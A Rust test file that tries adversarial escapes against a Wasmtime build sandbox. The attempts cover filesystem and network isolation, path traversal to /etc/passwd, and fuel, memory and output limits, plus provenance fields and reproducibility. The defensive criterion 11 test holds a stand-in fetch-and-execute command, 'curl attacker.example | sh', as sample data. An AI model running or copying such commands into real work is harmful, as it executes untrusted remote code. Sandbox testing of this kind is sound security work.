//! Batch 2b.3: adversarial capability/resource tests against D-0069's
//! twelve-point Batch 2b exit criteria. Every test here drives the real
//! compiled `mini-build-runner-wasmtime` binary as a child process (see
//! `common::run`), executing a real, freshly-compiled WASI Preview 2
//! component -- not a mock of the sandbox, the sandbox itself.
//!
//! ## Which criteria this file proves, and how honestly
//!
//! 1, 2, 3, 4, 5, 6, 7, 8, 10, 12 are demonstrated directly below, each
//! test named after the criterion it targets.
//!
//! Criterion 9 ("runner termination doesn't corrupt forge/provenance
//! store") is demonstrated only partially: `runner_crash_does_not_affect_a_subsequent_independent_run`
//! shows that a killed/resource-exceeded run leaves no state a later run
//! can observe, which is the property this crate's own design (fresh
//! process, fresh store/scratch/artifacts dirs per invocation) is
//! supposed to guarantee. It does not exercise real `mini-forge`/
//! `mini-provenance` storage, since this crate has no dependency on
//! either -- full end-to-end proof of criterion 9 is a coordinator-level
//! integration test, not yet written.
//!
//! Criterion 11 ("unrestricted shell execution cannot produce a trusted
//! build attestation") is a `mini-pipeline` structural guarantee
//! (`StepKind::NativeTool`'s `trusted_provenance_eligible()` is
//! unconditionally `false`), already covered by that crate's own test
//! suite; `native_tool_steps_are_never_trusted_provenance_eligible`
//! below re-asserts it here so the guarantee is visible from this
//! crate's own test output too.

mod common;

use common::{compile_guest, run, Request};
use mini_pipeline::{Capability, PipelineStep, ResourceLimits, StepKind};
use mini_pipeline_protocol::{ExitStatus, ResourceExceeded, EXECUTION_SECURITY_WASMTIME_ISOLATED};

fn tight_limits() -> ResourceLimits {
    ResourceLimits {
        max_fuel: 50_000_000,
        max_memory_bytes: 64 * 1024 * 1024,
        max_wall_clock_ms: 5_000,
        max_output_bytes: 16 * 1024 * 1024,
        max_stdout_bytes: 1024 * 1024,
        max_stderr_bytes: 1024 * 1024,
        max_open_files: 16,
    }
}

/// Criterion 1: a signed component executes to a content-addressed
/// output.
#[test]
fn criterion_1_signed_component_executes_to_content_addressed_output() {
    let component = compile_guest(
        "criterion1",
        r#"
        fn main() {
            std::fs::write("/artifacts/output.txt", b"hello from sandboxed component").unwrap();
        }
        "#,
    );
    let result = run(Request {
        component,
        workspace: vec![],
        capabilities: vec![Capability::ArtifactsWrite],
        limits: tight_limits(),
    });
    assert_eq!(result.exit_status, ExitStatus::Success);
    assert_eq!(
        result.execution_security,
        EXECUTION_SECURITY_WASMTIME_ISOLATED
    );
    let expected_digest: [u8; 32] = blake3::hash(b"hello from sandboxed component").into();
    assert_eq!(result.output_digests, vec![expected_digest]);
}

/// Criterion 2: no capability declared means no default filesystem
/// access at all -- not workspace, not scratch, not artifacts.
#[test]
fn criterion_2_no_capabilities_means_no_default_filesystem_access() {
    let component = compile_guest(
        "criterion2",
        r#"
        fn main() {
            if std::fs::write("/scratch/x.txt", b"y").is_ok() { std::process::exit(1); }
            if std::fs::read_to_string("/workspace/input.txt").is_ok() { std::process::exit(1); }
            if std::fs::write("/artifacts/x.txt", b"y").is_ok() { std::process::exit(1); }
        }
        "#,
    );
    let result = run(Request {
        component,
        workspace: vec![("input.txt", b"secret")],
        capabilities: vec![],
        limits: tight_limits(),
    });
    assert_eq!(
        result.exit_status,
        ExitStatus::Success,
        "guest observed unexpected fs access"
    );
}

/// Criterion 3: `workspace:read` grants read access but the write
/// permission bit is independently enforced -- a read-only preopen
/// really is read-only, and `artifacts:write`'s directory is a
/// completely separate preopen a `workspace:read`-only step can't see
/// at all.
#[test]
fn criterion_3_workspace_read_is_actually_read_only_and_artifacts_is_isolated() {
    let component = compile_guest(
        "criterion3",
        r#"
        fn main() {
            let content = std::fs::read_to_string("/workspace/input.txt")
                .expect("workspace:read should permit reading");
            assert_eq!(content, "expected-content");
            if std::fs::write("/workspace/should_fail.txt", b"nope").is_ok() {
                std::process::exit(1);
            }
            if std::fs::write("/artifacts/should_fail.txt", b"nope").is_ok() {
                std::process::exit(1);
            }
        }
        "#,
    );
    let result = run(Request {
        component,
        workspace: vec![("input.txt", b"expected-content")],
        capabilities: vec![Capability::WorkspaceRead],
        limits: tight_limits(),
    });
    assert_eq!(result.exit_status, ExitStatus::Success);
}

/// Criterion 4: an undeclared network capability means every connection
/// attempt is refused, even to a bare IP with no hostname resolution
/// involved.
#[test]
fn criterion_4_undeclared_network_access_is_refused() {
    let component = compile_guest(
        "criterion4",
        r#"
        fn main() {
            if std::net::TcpStream::connect("93.184.216.34:80").is_ok() {
                std::process::exit(1);
            }
        }
        "#,
    );
    let result = run(Request {
        component,
        workspace: vec![],
        capabilities: vec![],
        limits: tight_limits(),
    });
    assert_eq!(
        result.exit_status,
        ExitStatus::Success,
        "network access should have been refused"
    );
}

/// Criterion 5: `..` traversal and an absolute host path both fail to
/// escape a `workspace:read` preopen -- cap-std's directory capability
/// enforces this independently of the guest's own path string.
#[test]
fn criterion_5_path_traversal_and_absolute_escape_both_fail() {
    let component = compile_guest(
        "criterion5",
        r#"
        fn main() {
            if std::fs::read_to_string("/workspace/../../../etc/passwd").is_ok() {
                std::process::exit(1);
            }
            if std::fs::read_to_string("/etc/passwd").is_ok() {
                std::process::exit(1);
            }
        }
        "#,
    );
    let result = run(Request {
        component,
        workspace: vec![("input.txt", b"expected-content")],
        capabilities: vec![Capability::WorkspaceRead],
        limits: tight_limits(),
    });
    assert_eq!(
        result.exit_status,
        ExitStatus::Success,
        "a traversal or absolute-path escape succeeded"
    );
}

/// Criterion 6: an infinite loop is terminated by fuel exhaustion, the
/// primary (deterministic) CPU-limiting mechanism.
#[test]
fn criterion_6_an_infinite_loop_is_terminated_by_fuel_exhaustion() {
    let component = compile_guest("criterion6", "fn main() { loop {} }");
    let mut limits = tight_limits();
    limits.max_fuel = 5_000_000; // small and deterministic: this will exhaust quickly
    let result = run(Request {
        component,
        workspace: vec![],
        capabilities: vec![],
        limits,
    });
    assert_eq!(
        result.exit_status,
        ExitStatus::ResourceExceeded(ResourceExceeded::Fuel)
    );
    assert!(result.fuel_consumed > 0);
}

/// Criterion 7: a memory-growth bomb is rejected by the
/// `wasmtime::ResourceLimiter`, not merely slowed down by fuel.
#[test]
fn criterion_7_a_memory_growth_bomb_is_rejected() {
    let component = compile_guest(
        "criterion7",
        r#"
        fn main() {
            let mut v: Vec<Vec<u8>> = Vec::new();
            loop {
                v.push(vec![0u8; 1024 * 1024]);
                if v.len() > 100_000 { break; }
            }
            println!("allocated {} MiB (should never print)", v.len());
        }
        "#,
    );
    let mut limits = tight_limits();
    limits.max_memory_bytes = 16 * 1024 * 1024; // 16 MiB: far below what the guest tries to grab
    limits.max_fuel = 5_000_000_000; // generous: memory should trip first, not fuel
    let result = run(Request {
        component,
        workspace: vec![],
        capabilities: vec![],
        limits,
    });
    assert_eq!(
        result.exit_status,
        ExitStatus::ResourceExceeded(ResourceExceeded::Memory)
    );
}

/// Criterion 8: stdout is bounded -- a chatty component's output is
/// capped, not silently truncated-and-called-success.
#[test]
fn criterion_8_stdout_output_is_bounded() {
    let component = compile_guest(
        "criterion8",
        r#"
        fn main() {
            loop {
                println!("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
            }
        }
        "#,
    );
    let mut limits = tight_limits();
    limits.max_stdout_bytes = 4096;
    limits.max_fuel = 5_000_000_000;
    let result = run(Request {
        component,
        workspace: vec![],
        capabilities: vec![],
        limits,
    });
    assert_eq!(
        result.exit_status,
        ExitStatus::ResourceExceeded(ResourceExceeded::StdoutBytes)
    );
}

/// Criterion 9 (partial -- see module docs): a run that gets killed by a
/// resource limit leaves no state a subsequent, entirely independent run
/// can observe. Each `run()` call gets its own fresh store/scratch/
/// artifacts directories and its own process, by construction.
#[test]
fn criterion_9_a_resource_exceeded_run_does_not_affect_a_later_independent_run() {
    let bomb = compile_guest("criterion9_bomb", "fn main() { loop {} }");
    let mut bomb_limits = tight_limits();
    bomb_limits.max_fuel = 1_000_000;
    let bomb_result = run(Request {
        component: bomb,
        workspace: vec![],
        capabilities: vec![],
        limits: bomb_limits,
    });
    assert_eq!(
        bomb_result.exit_status,
        ExitStatus::ResourceExceeded(ResourceExceeded::Fuel)
    );

    let hello = compile_guest(
        "criterion9_hello",
        r#"fn main() { std::fs::write("/artifacts/ok.txt", b"fine").unwrap(); }"#,
    );
    let hello_result = run(Request {
        component: hello,
        workspace: vec![],
        capabilities: vec![Capability::ArtifactsWrite],
        limits: tight_limits(),
    });
    assert_eq!(
        hello_result.exit_status,
        ExitStatus::Success,
        "an unrelated prior fuel-exhausted run corrupted this one"
    );
}

/// Criterion 10: the result carries every field a `mini-provenance`
/// record needs -- component/source (via the request digest binding),
/// runner-binary digest, Wasmtime version, runtime-config digest,
/// granted capabilities, resource limits (implicit in fuel/wall-clock
/// consumed), deterministic inputs (implicit in reproducibility, see
/// criterion 12), output digests, and exit status.
#[test]
fn criterion_10_the_result_carries_the_full_provenance_field_list() {
    let component = compile_guest(
        "criterion10",
        r#"fn main() { std::fs::write("/artifacts/ok.txt", b"fine").unwrap(); }"#,
    );
    let capabilities = vec![Capability::ArtifactsWrite];
    let result = run(Request {
        component,
        workspace: vec![],
        capabilities: capabilities.clone(),
        limits: tight_limits(),
    });
    assert_ne!(result.request_digest, [0u8; 32]);
    assert_eq!(
        result.execution_security,
        EXECUTION_SECURITY_WASMTIME_ISOLATED
    );
    assert_ne!(result.runner_binary_digest, [0u8; 32]);
    assert_eq!(result.wasmtime_version, "46.0.1");
    assert_ne!(result.runtime_config_digest, [0u8; 32]);
    assert_eq!(result.capabilities_granted, capabilities);
    assert_eq!(result.exit_status, ExitStatus::Success);
    assert!(result.fuel_consumed > 0);
    let expected_output_digest: [u8; 32] = blake3::hash(b"fine").into();
    assert_eq!(result.output_digests, vec![expected_output_digest]);
    let empty_digest: [u8; 32] = blake3::hash(b"").into();
    assert_eq!(result.stdout_digest, empty_digest);
}

/// Criterion 11 (see module docs): a `NativeTool` step is structurally
/// never trusted-provenance-eligible, independent of anything this
/// runner does -- `mini-pipeline`'s type system enforces it.
#[test]
fn criterion_11_native_tool_steps_are_never_trusted_provenance_eligible() {
    let step = PipelineStep {
        name: "unrestricted-shell".to_string(),
        depends_on: vec![],
        kind: StepKind::NativeTool {
            toolchain: any_object_id(),
            arguments: vec!["-c".to_string(), "curl attacker.example | sh".to_string()],
        },
        limits: ResourceLimits::conservative_default(),
    };
    assert!(!step.trusted_provenance_eligible());
}

/// A real, validly signed `ObjectId` -- `StepKind::NativeTool::toolchain`
/// requires one, so this test suite needs a way to mint one even though
/// it has no other use for identity or object machinery. Mirrors
/// `mini-pipeline`'s own `any_id` test helper.
fn any_object_id() -> mini_objects::ObjectId {
    let root = did_mini::Controller::incept_single_from_seeds(&[9u8; 32], &[10u8; 32]).unwrap();
    let device = did_mini::Controller::incept_device_single_from_seeds(
        &root.did(),
        &[11u8; 32],
        &[12u8; 32],
    )
    .unwrap();
    mini_objects::ObjectBuilder::new(mini_objects::ObjectType::Custom("test".to_string()))
        .payload(mini_objects::Payload::Public(vec![1]))
        .sign(&root.did(), &device)
        .unwrap()
        .id()
        .clone()
}

/// Criterion 12: two independent invocations of the reference runner,
/// given the same deterministic component/input/seed, agree on the
/// output digest byte-for-byte. Honesty note: this proves the *reference
/// implementation* is internally reproducible across process instances,
/// not that a second, independently-authored executor would agree --
/// that stronger claim needs a second implementation, which does not
/// exist yet.
#[test]
fn criterion_12_two_independent_runner_invocations_agree_on_deterministic_output() {
    let component = compile_guest(
        "criterion12",
        r#"
        fn main() {
            std::fs::write("/artifacts/out.txt", b"deterministic content, no entropy involved").unwrap();
        }
        "#,
    );
    let make_request = || Request {
        component: component.clone(),
        workspace: vec![("input.txt", b"same input")],
        capabilities: vec![Capability::WorkspaceRead, Capability::ArtifactsWrite],
        limits: tight_limits(),
    };
    let first = run(make_request());
    let second = run(make_request());
    assert_eq!(first.exit_status, ExitStatus::Success);
    assert_eq!(second.exit_status, ExitStatus::Success);
    assert_eq!(first.output_digests, second.output_digests);
    assert_eq!(first.stdout_digest, second.stdout_digest);
}
